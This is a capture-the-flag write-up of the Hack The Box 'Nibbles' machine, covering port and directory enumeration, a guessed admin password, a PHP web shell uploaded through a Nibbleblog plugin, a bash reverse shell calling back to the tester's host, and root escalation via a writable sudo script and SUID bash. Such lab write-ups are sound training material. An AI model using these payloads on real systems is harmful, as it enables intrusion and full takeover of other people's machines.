---
layout: single
title: HTB - Nibbles
date: 2026-01-31
classes: wide
header:
  teaser: /assets/images/htb-nibbles/logo.png
  teaser_home_page: true
categories:
  - Hack The Box
  - Easy
  - Linux
tags:
  - file-upload-abuse
  - rce
  - sudo-abuse
  - suid-abuse
---


# Introduction
-------------

This writeup documents the penetration testing of the [**Nibbles**](https://app.hackthebox.com/machines/Nibbles) machine from the [**Hack The Box**](https://www.hackthebox.com/) platform. In this case, I'll be accessing a web pannel with trivial credentials, getting a reverse shell by exploiting a File Upload vuln and finally, privesc due to a sudo misconfiguration.

<br>
# Information Gathering
------------------

After identifying the target's IP address and operating system of the machine, we need to enumerate as  much information as possible about the host.

```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.15.145 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 13:48 CET
Initiating SYN Stealth Scan at 13:48
Scanning 10.129.15.145 [65535 ports]
Discovered open port 22/tcp on 10.129.15.145
Discovered open port 80/tcp on 10.129.15.145
Completed SYN Stealth Scan at 13:49, 20.96s elapsed (65535 total ports)
Nmap scan report for 10.129.15.145
Host is up, received user-set (0.11s latency).
Scanned at 2026-01-31 13:48:54 CET for 21s
Not shown: 49335 closed tcp ports (reset), 16198 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.06 seconds
           Raw packets sent: 102958 (4.530MB) | Rcvd: 49897 (1.996MB)
```

```
❯ nmap -sCV -p22,80 10.129.15.145 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 14:49 CET
Nmap scan report for 10.129.15.145
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.14 seconds
```

Nmap found some open ports. The intrusion is probably going to be, or at least start, from port 80. You can Google the Apache or SSH version followed by “launchpad” to get a good hint about the OS. You can also check the blog’s [Enumeration Cheat Sheet](https://pwnerguy.github.io/enumeration-cheatsheet/), which includes a table mapping service versions to possible operating system versions. We are facing an **Ubuntu Xenial (16.04)**

We can't do much with the SSH service since we don't have credentials yet. Now it's time to enumerate the web server running on the port 80.

```
❯ whatweb 10.129.15.145:80
http://10.129.15.145:80 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.15.145]
```

![](/assets/images/htb-nibbles/web.png)

Nothing interesting in the web, but in the source there is one comment.

```html
<b>Hello world!</b> 


<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

```
❯ whatweb 10.129.15.145:80/nibbleblog/
http://10.129.15.145:80/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.15.145], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```

![](/assets/images/htb-nibbles/blog.png)

This is a sort of a blog that is using technologies such as PHP, jQuery, RSS, Nibbleblog... It has nothing interesting in the web or source code, so we now need to fuzz as much as we can.

> **Nibbleblog** is a blog platform that uses XML databases as opposed to MySQL and others. It is small, weighing in at less than half a megabyte and easy to install.

```
❯ gobuster dir -u http://10.129.15.188/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 30 -x php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.15.188/nibbleblog/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2987]
/sitemap.php          (Status: 200) [Size: 402]
/content              (Status: 301) [Size: 327] [--> http://10.129.15.188/nibbleblog/content/]
/themes               (Status: 301) [Size: 326] [--> http://10.129.15.188/nibbleblog/themes/]
/feed.php             (Status: 200) [Size: 302]
/admin                (Status: 301) [Size: 325] [--> http://10.129.15.188/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/plugins              (Status: 301) [Size: 327] [--> http://10.129.15.188/nibbleblog/plugins/]
/install.php          (Status: 200) [Size: 78]
/update.php           (Status: 200) [Size: 1622]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 329] [--> http://10.129.15.188/nibbleblog/languages/]
Progress: 175324 / 175324 (100.00%)
===============================================================
Finished
===============================================================
```

![](/assets/images/htb-nibbles/nibbleblog_version.png)

<br>
# Vulnerability Assessment
------

We got the **Nibbleblog's version** from the `README` file and an interesting `admin.php` file which is a login page that blocks us after failing some loggin attempts. Also, the _Forgot password_ button doesn't work. The file `/nibbleblog/content/private/users.xml` confirms that the admin user is "admin". If you take a look at the `config.xml` file you'll see some email addresses and the name of the machine. Could `nibbles` be the admin's password? The answer is **yes**, the platform uses trivial credentials.

We gathered information and finally figured out the credentials. Just because Nibbleblog's version is 4 and we have logged in I will not try the SQLi, besides I'll not try the Metasploit File Upload, since I want to do it manually.

```
❯ searchsploit nibble
--------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                               |  Path
--------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                       | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                        | php/remote/38489.rb
--------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

![](/assets/images/htb-nibbles/file_upload.png)

<br>
# Exploitation
----

Since it has a Plugin that allow us to upload files, I can try to upload a simple PHP file to get a RCE to execute commands on the machine and after uploading it, I need to find where this file is.

```php
<?php system($_GET['cmd']); ?>
```

![](/assets/images/htb-nibbles/rce.png)

To get a reverse shell I'll execute this URL-encoded command: `bash -c "bash -i >%26 %2Fdev%2Ftcp%2F10.10.14.210%2F443 0>%261"` 

```
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.210] from (UNKNOWN) [10.129.15.188] 35662
bash: cannot set terminal process group (1260): Inappropriate ioctl for device
bash: no job control in this shell
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ whoami
<ml/nibbleblog/content/private/plugins/my_image$ whoami                      
nibbler
```

<br>
# Post-Exploitation
------

I'm `nibbler` which is the user with web server privileges. Let's get a TTY upgrade to get a better shell.

```
❯ script /dev/null -c bash
ctrl+z
❯ stty raw -echo; fg
❯ reset xterm
❯ export TERM=xterm
❯ export SHELL=bash
❯ stty rows 45 columns 184
```

```
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

`nibbler` can execute `/home/nibbler/personal/stuff/monitor.sh` as root. This script doesn't exist in the file system, because you need to unzip `/home/nibbler/personal.zip` to access `/home/nibbler/personal/stuff` and edit the `monitor.sh` script. I'll be adding at the beggining of the script the command `chmod +s /bin/bash` to make /bin/bash a SUID file and, that way, I'll be able to spawn a root shell.

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ /bin/bash -p
bash-4.3# whoami
root
```
